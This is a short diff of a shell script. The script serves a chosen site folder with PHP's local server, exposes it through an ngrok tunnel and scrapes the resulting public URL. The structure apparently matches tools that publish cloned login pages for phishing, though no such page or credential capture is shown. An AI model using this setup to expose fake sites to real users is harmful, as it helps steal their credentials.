@@ -46,8 +46,8 @@ fi
 printf "${green}Starting Personal Home Page (PHP)...${reset} \n"
 cd sites/$site && php -S 127.0.0.1:$port
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+printf "${green}Starting ngrok${reset} \n"
+./ngrok http $port
 sleep 10
 
 link=$( curl -S -n http://127.0.0.1:4040/api/tunnels | grep -oE "https:\/\/[a-z0-9\-]*\.ngrok\.io")
